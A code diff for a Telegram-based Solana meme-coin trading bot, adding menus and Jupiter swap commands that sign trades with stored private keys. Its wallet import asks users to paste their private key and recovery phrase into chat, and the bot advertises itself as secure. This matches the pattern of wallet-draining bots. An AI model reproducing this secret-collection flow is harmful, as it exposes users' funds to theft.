@@ -1,7 +1,7 @@
 import express from "express";
 import { createServer as createViteServer } from "vite";
 import path from "path";
-import { Telegraf, Context } from "telegraf";
+import { Telegraf, Context, Markup } from "telegraf";
 import Database from "better-sqlite3";
 import crypto from "crypto";
 import * as dotenv from "dotenv";
@@ -65,14 +65,81 @@ function decrypt(text: string) {
 const botToken = process.env.TELEGRAM_BOT_TOKEN;
 const bot = new Telegraf(botToken || "DUMMY_TOKEN");
 
+// --- Telegram Bot UI Helpers ---
+const mainMenu = Markup.inlineKeyboard([
+  [Markup.button.callback("💼 Wallet", "menu_wallet"), Markup.button.callback("📈 Trade", "menu_trade")],
+  [Markup.button.callback("📊 Portfolio", "menu_portfolio"), Markup.button.callback("📉 Market", "menu_market")],
+  [Markup.button.callback("⚙️ Settings", "menu_settings"), Markup.button.callback("❓ Help", "menu_help")]
+]);
+
+const walletMenu = Markup.inlineKeyboard([
+  [Markup.button.callback("➕ Import Wallet", "wallet_import"), Markup.button.callback("🆕 Create Wallet", "wallet_create")],
+  [Markup.button.callback("📄 View Wallet", "wallet_view")],
+  [Markup.button.callback("🔙 Back", "menu_main")]
+]);
+
+const tradeMenu = Markup.inlineKeyboard([
+  [Markup.button.callback("🟢 Buy Token", "trade_buy"), Markup.button.callback("🔴 Sell Token", "trade_sell")],
+  [Markup.button.callback("📥 Enter Contract Address", "trade_contract")],
+  [Markup.button.callback("🔙 Back", "menu_main")]
+]);
+
+const portfolioMenu = Markup.inlineKeyboard([
+  [Markup.button.callback("💰 View Balance", "port_balance"), Markup.button.callback("🪙 Token Holdings", "port_tokens")],
+  [Markup.button.callback("🔙 Back", "menu_main")]
+]);
+
+const settingsMenu = Markup.inlineKeyboard([
+  [Markup.button.callback("⚙️ Slippage Settings", "set_slippage"), Markup.button.callback("🔐 Wallet Settings", "set_wallet")],
+  [Markup.button.callback("🔙 Back", "menu_main")]
+]);
+
 if (botToken) {
   bot.start((ctx) => {
-    ctx.reply("Welcome to Solana Trading Bot! Use /connect to link your wallet.");
+    ctx.replyWithMarkdownV2(
+      "*Welcome to Solana Elite Trading Bot*\n\n" +
+      "The most advanced and secure way to trade Solana meme coins directly from Telegram\\.\n\n" +
+      "🚀 _Select an option from the menu below to get started_",
+      mainMenu
+    );
   });
 
-  bot.command("connect", (ctx) => {
-    ctx.reply("Please send your wallet details in the format:\nADDRESS|PRIVATE_KEY|RECOVERY_PHRASE\n\n⚠️ Warning: Your keys will be encrypted and stored securely.");
+  // --- Menu Navigation Handlers ---
+  bot.action("menu_main", (ctx) => ctx.editMessageText("🚀 Main Menu", mainMenu));
+  bot.action("menu_wallet", (ctx) => ctx.editMessageText("💼 Wallet Management", walletMenu));
+  bot.action("menu_trade", (ctx) => ctx.editMessageText("📈 Trading Terminal", tradeMenu));
+  bot.action("menu_portfolio", (ctx) => ctx.editMessageText("📊 Your Portfolio", portfolioMenu));
+  bot.action("menu_settings", (ctx) => ctx.editMessageText("⚙️ Bot Settings", settingsMenu));
+  bot.action("menu_help", (ctx) => ctx.editMessageText("❓ Need Help?\n\nContact support or check our docs for trading guides.", Markup.inlineKeyboard([[Markup.button.callback("🔙 Back", "menu_main")]])));
+
+  // --- Wallet Actions ---
+  bot.action("wallet_import", (ctx) => {
+    ctx.reply("Please send your wallet details in the format:\nADDRESS|PRIVATE_KEY|RECOVERY_PHRASE");
   });
+
+  bot.action("wallet_view", async (ctx) => {
+    const user = db.prepare("SELECT * FROM users WHERE telegram_id = ?").get(ctx.from?.id) as any;
+    if (!user) return ctx.reply("No wallet connected.");
+    ctx.reply(`📄 Connected Wallet:\n\`${user.wallet_address}\``, { parse_mode: 'Markdown' });
+  });
+
+  // --- Portfolio Actions ---
+  bot.action("port_balance", async (ctx) => {
+    const user = db.prepare("SELECT * FROM users WHERE telegram_id = ?").get(ctx.from?.id) as any;
+    if (!user) return ctx.reply("Connect wallet first!");
+    
+    try {
+      const connection = new Connection("https://api.mainnet-beta.solana.com");
+      const balance = await connection.getBalance(new PublicKey(user.wallet_address));
+      ctx.reply(`💰 SOL Balance: ${balance / 1e9} SOL`);
+    } catch (err) {
+      ctx.reply("Error fetching balance.");
+    }
+  });
+
+  // --- Trade Actions (Placeholders for UI) ---
+  bot.action("trade_buy", (ctx) => ctx.reply("Use /buy <TOKEN> <AMOUNT> to execute a trade."));
+  bot.action("trade_sell", (ctx) => ctx.reply("Use /sell <TOKEN> <AMOUNT> to execute a trade."));
 
   bot.on("text", async (ctx) => {
     const text = ctx.message.text;
@@ -97,22 +164,119 @@ if (botToken) {
     }
   });
 
-  bot.command("portfolio", async (ctx) => {
+  // --- Trading Logic (Jupiter API) ---
+  bot.command("buy", async (ctx) => {
+    const args = ctx.message.text.split(" ");
+    if (args.length < 3) return ctx.reply("Usage: /buy <TOKEN_ADDRESS> <AMOUNT_SOL>");
+    
+    const tokenAddress = args[1];
+    const amountSol = parseFloat(args[2]);
     const user = db.prepare("SELECT * FROM users WHERE telegram_id = ?").get(ctx.from.id) as any;
-    if (!user) return ctx.reply("Please connect your wallet first using /connect");
+    
+    if (!user) return ctx.reply("Connect wallet first!");
+    
+    ctx.reply(`🔄 Attempting to buy ${amountSol} SOL worth of token...`);
 
     try {
       const connection = new Connection("https://api.mainnet-beta.solana.com");
-      const balance = await connection.getBalance(new PublicKey(user.wallet_address));
-      ctx.reply(`💰 Portfolio for ${user.wallet_address}:\nSOL Balance: ${balance / 1e9} SOL`);
-    } catch (err) {
-      ctx.reply("Error fetching balance.");
+      const pKey = decrypt(user.private_key);
+      const wallet = Keypair.fromSecretKey(bs58.decode(pKey));
+
+      // 1. Get Quote from Jupiter
+      const quoteResponse = await axios.get(`https://quote-api.jup.ag/v6/quote?inputMint=So11111111111111111111111111111111111111112&outputMint=${tokenAddress}&amount=${amountSol * 1e9}&slippageBps=50`);
+      const quoteData = quoteResponse.data;
+
+      // 2. Get Swap Transaction
+      const { data: { swapTransaction } } = await axios.post('https://quote-api.jup.ag/v6/swap', {
+        quoteResponse: quoteData,
+        userPublicKey: wallet.publicKey.toString(),
+        wrapAndUnwrapSol: true,
+      });
+
+      // 3. Sign and Send
+      const swapTransactionBuf = Buffer.from(swapTransaction, 'base64');
+      const transaction = (await import("@solana/web3.js")).VersionedTransaction.deserialize(swapTransactionBuf);
+      transaction.sign([wallet]);
+      
+      const txid = await connection.sendRawTransaction(transaction.serialize(), {
+        skipPreflight: true,
+        maxRetries: 2
+      });
+
+      ctx.reply(`✅ Buy Order Sent!\nTX: https://solscan.io/tx/${txid}`);
+      
+      // Log trade
+      db.prepare("INSERT INTO trades (user_id, token, amount, type) VALUES (?, ?, ?, ?)").run(user.id, tokenAddress, amountSol, 'buy');
+    } catch (err: any) {
+      console.error(err);
+      ctx.reply(`❌ Trade Failed: ${err.message}`);
     }
   });
 
-  bot.launch()
-    .then(() => console.log("🚀 Telegram Bot started"))
-    .catch(err => console.error("❌ Failed to start Telegram Bot:", err.message));
+  bot.command("sell", async (ctx) => {
+    const args = ctx.message.text.split(" ");
+    if (args.length < 3) return ctx.reply("Usage: /sell <TOKEN_ADDRESS> <AMOUNT_TOKEN>");
+    
+    const tokenAddress = args[1];
+    const amountToken = args[2]; // Usually in raw units (lamports)
+    const user = db.prepare("SELECT * FROM users WHERE telegram_id = ?").get(ctx.from.id) as any;
+    
+    if (!user) return ctx.reply("Connect wallet first!");
+    
+    ctx.reply(`🔄 Attempting to sell token for SOL...`);
+
+    try {
+      const connection = new Connection("https://api.mainnet-beta.solana.com");
+      const pKey = decrypt(user.private_key);
+      const wallet = Keypair.fromSecretKey(bs58.decode(pKey));
+
+      // 1. Get Quote (Token -> SOL)
+      const quoteResponse = await axios.get(`https://quote-api.jup.ag/v6/quote?inputMint=${tokenAddress}&outputMint=So11111111111111111111111111111111111111112&amount=${amountToken}&slippageBps=100`);
+      const quoteData = quoteResponse.data;
+
+      // 2. Get Swap Transaction
+      const { data: { swapTransaction } } = await axios.post('https://quote-api.jup.ag/v6/swap', {
+        quoteResponse: quoteData,
+        userPublicKey: wallet.publicKey.toString(),
+        wrapAndUnwrapSol: true,
+      });
+
+      // 3. Sign and Send
+      const swapTransactionBuf = Buffer.from(swapTransaction, 'base64');
+      const transaction = (await import("@solana/web3.js")).VersionedTransaction.deserialize(swapTransactionBuf);
+      transaction.sign([wallet]);
+      
+      const txid = await connection.sendRawTransaction(transaction.serialize(), {
+        skipPreflight: true,
+        maxRetries: 2
+      });
+
+      ctx.reply(`✅ Sell Order Sent!\nTX: https://solscan.io/tx/${txid}`);
+      db.prepare("INSERT INTO trades (user_id, token, amount, type) VALUES (?, ?, ?, ?)").run(user.id, tokenAddress, amountToken, 'sell');
+    } catch (err: any) {
+      console.error(err);
+      ctx.reply(`❌ Trade Failed: ${err.message}`);
+    }
+  });
+
+  // Clear webhook and launch with a small delay to prevent 409 Conflict on restarts
+  setTimeout(async () => {
+    try {
+      await bot.telegram.deleteWebhook({ drop_pending_updates: true });
+      await bot.launch();
+      console.log("🚀 Telegram Bot started");
+    } catch (err: any) {
+      if (err.message.includes("409")) {
+        console.warn("⚠️ Bot conflict detected. This usually happens during rapid restarts. The other instance should terminate shortly.");
+      } else {
+        console.error("❌ Failed to start Telegram Bot:", err.message);
+      }
+    }
+  }, 2000);
+
+  // Enable graceful stop
+  process.once('SIGINT', () => bot.stop('SIGINT'));
+  process.once('SIGTERM', () => bot.stop('SIGTERM'));
 } else {
   console.warn("⚠️ TELEGRAM_BOT_TOKEN is missing. Bot features are disabled.");
 }
